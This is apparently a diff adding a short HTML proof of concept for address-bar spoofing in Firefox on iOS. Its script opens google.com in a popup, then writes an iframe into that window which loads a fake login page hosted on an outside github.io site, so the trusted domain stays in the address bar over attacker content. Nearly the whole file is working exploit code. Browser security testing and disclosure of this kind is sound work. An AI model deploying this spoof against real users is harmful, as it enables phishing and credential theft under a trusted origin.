@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Address Bar Spoofing PoC</title>
+<style>
+body { font-family: Arial; text-align:center; margin-top:80px; }
+iframe { width:90%; height:80vh; border:1px solid #ccc; }
+.note { color:red; font-size:13px; margin-bottom:10px; }
+</style>
+
+<script>
+function go() {
+    // Open trusted origin
+    var win = window.open("https://www.google.com/csi", "_blank");
+
+    if (!win) {
+        alert("Popup blocked");
+        return;
+    }
+
+    setTimeout(function () {
+        try {
+            // Replace document with attacker content (iframe only)
+            win.document.open();
+            win.document.write(`
+                <p class="note">
+                    Demo: Address bar shows google.com, but content below is attacker-controlled.
+                </p>
+
+                <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
+            `);
+            win.document.close();
+
+        } catch (e) {
+            console.log("Blocked:", e);
+        }
+    }, 3000);
+}
+</script>
+</head>
+
+<body>
+<h2>Firefox iOS Address Bar Spoofing Test</h2>
+<button onclick="go()">Start Test</button>
+</body>
+</html>
